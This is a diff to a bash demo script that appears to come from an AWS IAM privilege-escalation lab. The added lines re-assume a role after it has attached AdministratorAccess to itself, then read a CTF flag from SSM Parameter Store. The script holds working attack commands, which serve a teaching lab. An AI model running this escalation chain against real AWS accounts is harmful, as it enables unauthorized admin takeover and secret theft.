@@ -190,17 +190,47 @@ echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
-# Summary
+# [EXPLOIT] Step 7: Capture the CTF flag
+# The starting role now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Re-assume the role with the escalated session, or simply switch to the
+# role credentials already in the environment (they reflect the newly attached policy).
+use_starting_creds
+echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-009-to-admin"
+
+# Re-assume the role to pick up the freshly attached AdministratorAccess policy
+ASSUME_ROLE_OUTPUT2=$(aws sts assume-role \
+    --role-arn "$ROLE_ARN" \
+    --role-session-name "arp-flag-session")
+export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.SessionToken')
+
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}\n"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
-echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
 echo -e "Step 2: Used ${YELLOW}iam:AttachRolePolicy${NC} to attach AdministratorAccess to self"
-echo -e "Result: ${GREEN}Administrator Access${NC}"
+echo -e "Step 3: Re-assumed role to pick up escalated permissions"
+echo -e "Step 4: Captured CTF flag from SSM Parameter Store: ${GREEN}$FLAG_VALUE${NC}"
+echo -e "Result: ${GREEN}Administrator Access + CTF Flag${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → Admin"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → Admin → (ssm:GetParameter) → CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -213,9 +243,6 @@ fi
 
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the AdministratorAccess policy${NC}"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
